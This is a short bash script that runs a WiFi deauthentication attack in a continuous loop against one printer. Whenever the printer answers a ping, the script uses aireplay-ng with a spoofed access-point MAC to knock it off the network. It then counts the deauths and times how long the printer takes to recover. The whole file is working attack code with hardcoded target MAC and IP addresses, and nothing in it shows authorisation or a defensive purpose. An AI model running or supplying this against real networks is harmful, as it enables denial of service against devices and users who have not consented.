#!/bin/bash

#Set to Router/AP's MAC Address
APmac=00:11:0a:e9:a5:0d
#Set to printer's MAC Address
Pmac=38:63:bb:c5:40:45
#Set to printer's IP Address
PIP=10.19.48.108
#Set to the monitor interface ( mon0, mon1, etc )
mon=mon0
Count=0
ST=$SECONDS

while :
do
echo
echo "Pinging printer"
echo
ping -q -c 1 $PIP
if [ $? == 0 ]
then
echo
sudo /usr/sbin/aireplay-ng -0 1 -a $APmac -c $Pmac $mon --ignore-negative-one 
ET=$(($SECONDS - $ST))
ST=$SECONDS
Count=$((Count+1))
echo
clear
echo "Time taken for printer to recover " $ET "seconds"
echo "Deauth acount = "$Count
echo
else
clear
ET=$((SECONDS - $ST))
echo
echo "Printer has been disassociated for " $ET "seconds"
echo "Deauth count = " $Count
echo
fi
done
